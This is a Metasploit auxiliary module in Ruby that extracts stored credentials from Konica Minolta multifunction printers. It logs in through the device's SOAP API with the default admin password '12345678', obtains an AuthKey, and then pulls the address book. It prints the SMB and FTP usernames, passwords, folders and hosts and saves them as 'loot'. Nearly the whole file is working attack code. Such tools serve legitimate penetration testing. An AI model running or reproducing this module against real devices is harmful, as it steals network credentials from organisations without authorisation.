#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Konica Minolta Password Exractor',
      'Description'    => %{
        This module will extract the passwords from Konica Minolta mfp devices .
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('RPORT', [ true, 'The target port', 50001]),
        OptString.new('USER', [ false, 'The default Admin user', 'Admin']),
        OptString.new('PASSWD', [ true, 'The default Admin password', '12345678']),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end
#-----------------------------------------------------------------------------------------------

# start the train wreck


##############################################################################
 # Creates the XML data to be sent that will extract AuthKey
  def generate_authkey_request_xlm()
    user = datastore['USER']
    passwd = datastore['PASSWD']
    xmlauthreq = "<SOAP-ENV:Envelope"
    xmlauthreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
    xmlauthreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
    xmlauthreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
    xmlauthreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
    xmlauthreq << "<SOAP-ENV:Header>"
    xmlauthreq << "<me:AppReqHeader"
    xmlauthreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{$major}-#{$minor}'>"
    xmlauthreq << "<ApplicationID xmlns=''>0</ApplicationID>"
    xmlauthreq << "<UserName xmlns=''></UserName>"
    xmlauthreq << "<Password xmlns=''></Password>"
    xmlauthreq << "<Version xmlns=''>"
    xmlauthreq << "<Major>#{$major}</Major>"
    xmlauthreq << "<Minor>#{$minor}</Minor>"
    xmlauthreq << "</Version>"
    xmlauthreq << "<AppManagementID xmlns=''>0</AppManagementID>"
    xmlauthreq << "</me:AppReqHeader>"
    xmlauthreq << "</SOAP-ENV:Header>"
    xmlauthreq << "<SOAP-ENV:Body>"
    xmlauthreq << "<AppReqLogin xmlns='http://www.konicaminolta.com/service/OpenAPI-#{$major}-#{$minor}'>"
    xmlauthreq << "<OperatorInfo>"
    xmlauthreq << "<UserType>#{user}</UserType>"
    xmlauthreq << "<Password>#{passwd}</Password>"
    xmlauthreq << "</OperatorInfo>"
    xmlauthreq << "<TimeOut>60</TimeOut>"
    xmlauthreq << "</AppReqLogin>"
    xmlauthreq << "</SOAP-ENV:Body>"
    xmlauthreq << "</SOAP-ENV:Envelope>"
    return xmlauthreq
  end
############################################################################################
#  Create XML data that will be sent to extract SMB passwords for devices
  def generate_smbpwd_request_xlm()
    xmlsmbreq = "<SOAP-ENV:Envelope"
    xmlsmbreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
    xmlsmbreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
    xmlsmbreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
    xmlsmbreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
    xmlsmbreq << "<SOAP-ENV:Header><me:AppReqHeader"
    xmlsmbreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{$major}-#{$minor}'>"
    xmlsmbreq << "<ApplicationID xmlns=''>0</ApplicationID>"
    xmlsmbreq << "<UserName xmlns=''></UserName>"
    xmlsmbreq << "<Password xmlns=''></Password>"
    xmlsmbreq << "<Version xmlns=''><Major>#{$major}</Major>"
    xmlsmbreq << "<Minor>#{$minor}</Minor></Version>"
    xmlsmbreq << "<AppManagementID xmlns=''>1000</AppManagementID>"
    xmlsmbreq << "</me:AppReqHeader></SOAP-ENV:Header>"
    xmlsmbreq << "<SOAP-ENV:Body><AppReqGetAbbr xmlns='http://www.konicaminolta.com/service/OpenAPI-#{$major}-#{$minor}'>"
    xmlsmbreq << "<OperatorInfo>"
    xmlsmbreq << "<AuthKey>#{$authkey}</AuthKey>"
    xmlsmbreq << "</OperatorInfo><AbbrListCondition>"
    xmlsmbreq << "<SearchKey>None</SearchKey>"
    xmlsmbreq << "<WellUse>false</WellUse>"
    xmlsmbreq << "<ObtainCondition>"
    xmlsmbreq << "<Type>OffsetList</Type>"
    xmlsmbreq << "<OffsetRange><Start>1</Start><Length>100</Length></OffsetRange>"
    xmlsmbreq << "</ObtainCondition>"
    xmlsmbreq << "<BackUp>true</BackUp>"
    xmlsmbreq << "<BackUpPassword>MYSKIMGS</BackUpPassword>"
    xmlsmbreq << "</AbbrListCondition></AppReqGetAbbr>"
    xmlsmbreq << "</SOAP-ENV:Body>"
    xmlsmbreq << "</SOAP-ENV:Envelope>"
    return xmlsmbreq
  end

# this next section will post the xml soap message xmlauthreq.
  def run_host(ip)
    print_status("Attempting to extract username and password for the host at #{rhost}")
    version
    login
    extract
  end


# Global Variables
  $uri = ("/")


# validate xml major minor
  def version()

  # Send post request to identify XML version
    begin
      response = send_request_cgi({
        'uri'    => "#{$uri}",
        'method' => 'POST',
        'data'   => "<SOAP-ENV:Envelope></SOAP-ENV:Envelope>"
        })
      xml0_body= ::Nokogiri::XML(response.body)
      major_parse = xml0_body.xpath("//Major").text
      minor_parse = xml0_body.xpath("//Minor").text
      $major = ("#{major_parse}")
      $minor = ("#{minor_parse}")
      #print_good("#{$major}")
      #print_good("#{$minor}")

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
    print_error("#{rhost} - Version check Connection failed.")
    return nil
    end
  end

# This section logs on and retrieves AuthKey token
  def login()

  # create xml request to authenticat
    authreq_xml = generate_authkey_request_xlm()

  # Send post request with crafted XML to login and retreive AuthKey
    begin
      response = send_request_cgi({
        'uri'    => "#{$uri}",
        'method' => 'POST',
        'data'   => "#{authreq_xml}"
        })
      xml1_body= ::Nokogiri::XML(response.body)
      authkey_parse = xml1_body.xpath("//AuthKey").text
      #print_good("AuthKey= #{authkey_parse}")
      $authkey = ("#{authkey_parse}")

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
    print_error("#{rhost} - Login Connection failed.")
    return nil
    end
  end


# This next section will post xml soap message  that will extract username and passwords
  def extract()

    if ($authkey != "")
    # create xml request to extract user credintial settings
      smbreq_xml = generate_smbpwd_request_xlm()

    # Send post request with crafted XML as data
      begin
        response = send_request_cgi({
          'uri'    => "#{$uri}",
          'method' => 'POST',
          'data'   => "#{smbreq_xml}"
          })
        xml2_body = ::Nokogiri::XML(response.body)
        @user_data = xml2_body.xpath("//User").map do |val|
        val.text
        end
        @pass_data = xml2_body.xpath("//Password").map do |val1|
        val1.text
        end
        @fold_data = xml2_body.xpath("//Folder").map do |val2|
        val2.text
        end
        @addr_data = xml2_body.xpath("//Address").map do |val3|
        val3.text
        end
        @host_data = xml2_body.xpath("//Host").map do |val4|
        val4.text
        end

     i = 0
     credinfo = ""
     credinfo << "Username:Password:Folder:FTP HOST:SMB HOST \n"
     @user_data.each do
     print_good("User=#{@user_data[i]}:Password=#{@pass_data[i]}:Folder=#{@fold_data[i]}:ftp_host=#{@addr_data[i]}:SMB_host=#{@host_data[i]}")
     credinfo << "#{@user_data[i]}:#{@pass_data[i]}:#{@fold_data[i]}:#{@addr_data[i]}:#{@host_data[i]}" << "\n"
     i = i+1
     end

     #Woot we got loot.
     loot_name     = "konica_pwds"
     loot_type     = "text/plain"
     loot_filename = "konica_pwds.text"
     loot_desc     = "SMB and FTP usernames and passwords"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], credinfo , loot_filename, loot_desc)
     print_status("Credentials saved in: #{p.to_s}")

     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
     vprint_error("Unable to connect to #{$rhost}")
     return nil
     end
     return response
   else
     print_status("No AuthKey returned possible causes Authentication failed or unsupported Konica model")
     return
   end
 end
end
